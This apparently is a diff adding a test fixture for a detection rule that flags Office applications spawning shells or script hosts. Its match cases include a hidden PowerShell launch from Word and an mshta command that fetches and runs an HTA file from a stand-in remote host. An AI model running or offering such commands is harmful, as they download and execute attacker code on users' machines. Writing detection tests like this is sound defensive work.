@@ -1,0 +1,15 @@
+rule: Office Application Spawning a Shell or Script Host
+match:
+  - ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+    Image: 'C:\Windows\System32\cmd.exe'
+    CommandLine: 'cmd.exe /c powershell -w hidden -c ...'
+  - ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE'
+    Image: 'C:\Windows\System32\mshta.exe'
+    CommandLine: 'mshta.exe http://203.0.113.9/invoice.hta'
+nomatch:
+  - ParentImage: 'C:\Windows\explorer.exe'
+    Image: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+    CommandLine: '"WINWORD.EXE" /n "C:\Users\anna\Documents\report.docx"'
+  - ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+    Image: 'C:\Windows\splwow64.exe'
+    CommandLine: 'splwow64.exe 12288'
